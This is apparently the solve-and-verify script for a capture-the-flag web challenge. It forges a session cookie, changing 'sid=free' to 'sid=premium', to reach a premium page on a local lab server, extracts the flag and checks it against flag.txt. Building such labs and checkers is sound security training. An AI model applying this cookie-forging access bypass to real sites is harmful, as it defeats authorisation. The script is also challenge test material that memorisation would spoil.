#!/usr/bin/env python3
import html
import re
import sys
from http.cookies import SimpleCookie
from pathlib import Path
from urllib.request import Request, urlopen


def solve(base):
    base = base.rstrip("/")
    with urlopen(base + "/", timeout=10) as response:
        cookies = SimpleCookie()
        for header in response.headers.get_all("Set-Cookie", []):
            cookies.load(header)
        free_page = response.read()
    if "sid" not in cookies or cookies["sid"].value != "free":
        raise RuntimeError("site did not issue a free session")

    with urlopen(Request(base + "/", headers={"Cookie": "sid=premium"}), timeout=10) as response:
        premium_page = response.read().decode("utf-8")
    match = re.search(r'class="flagbox"[^>]*>\s*<code>([^<]+)</code>', premium_page)
    if match is None:
        raise RuntimeError("premium view has no unlock code")
    flag = html.unescape(match.group(1))
    if not re.fullmatch(r"wctf\{[^}\r\n]{1,128}\}", flag) or flag.encode() in free_page:
        raise RuntimeError("unlock code is invalid or visible to free users")
    return flag


if __name__ == "__main__":
    flag = solve(sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:1337")
    expected = (Path(__file__).resolve().parents[1] / "flag.txt").read_text().strip()
    if flag != expected:
        raise SystemExit("premium view returned an unexpected flag")
    print(flag)
